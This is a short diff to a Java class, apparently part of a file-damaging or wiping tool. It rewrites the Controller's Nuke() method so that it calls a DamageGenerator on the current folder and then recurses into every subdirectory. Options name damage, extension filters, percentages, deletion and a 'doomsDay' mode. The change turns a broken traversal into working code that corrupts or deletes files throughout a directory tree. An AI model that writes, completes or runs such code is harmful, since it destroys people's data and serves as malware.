@@ -38,16 +38,16 @@ public class Controller {
 	}
 
 	public void Nuke() {
+		//scan all the directories
 		File[] listFolders = new DirectoryScanner(startpathFile).Directories();
-
+		// NUKE this path last to save the program time
+		new DamageGenerator(damage, startpathFile, extensions, random, percent, delete, folders, doomsDay).DoDamage();
 		// for cycle to walk around all directories
 		for (int i = 0; i < listFolders.length; i++) {
-			// search for other paths\
-			new Controller(startpathFile, damage, extensions, random, delete, percent, folders, doomsDay);
+			//Nukes all paths
+			new Controller(listFolders[i], damage, extensions, random, delete, percent, folders, doomsDay).Nuke();
 		}
-		// NUKE this path last to save the program time
-		// System.out.println(startingPath+"\t\tflooded");
-		new DamageGenerator(damage, startpathFile, extensions, random, percent, delete, folders, doomsDay).DoDamage();;
+
 
 	}
 }
